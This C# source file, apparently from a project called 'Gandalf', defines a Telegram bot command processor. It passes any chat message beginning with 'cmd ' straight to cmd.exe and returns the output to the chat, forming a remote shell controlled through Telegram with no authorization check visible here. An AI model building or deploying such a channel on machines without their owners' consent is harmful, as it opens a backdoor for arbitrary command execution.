using System.Diagnostics;
using Telegram.Bot;

namespace Gandalf.Processors
{
    public class CmdCommandProcessor : CommandProcessor, ICommandProcessor
    {
        public CmdCommandProcessor(ITelegramBotService service) : base(service)
        {
        }

        public async Task<bool> Process(string message)
        {
            if (!message.ToLower().Trim().StartsWith("cmd "))
                return false;

            var cmd = message.Substring(message.IndexOf(' ') + 1).Trim();
            Process process = new Process();
            process.StartInfo.WorkingDirectory = service.CurrentDir;
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " + cmd;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.Start();
            var res = process.StandardOutput.ReadToEnd();
            var err = process.StandardError.ReadToEnd();
            process.WaitForExit();

            await service.Bot.SendTextMessageAsync(
       chatId: service.ChatId,
       text: "status:\n" + res,
       cancellationToken: service.CancellationToken);

            return true;
        }
    }
}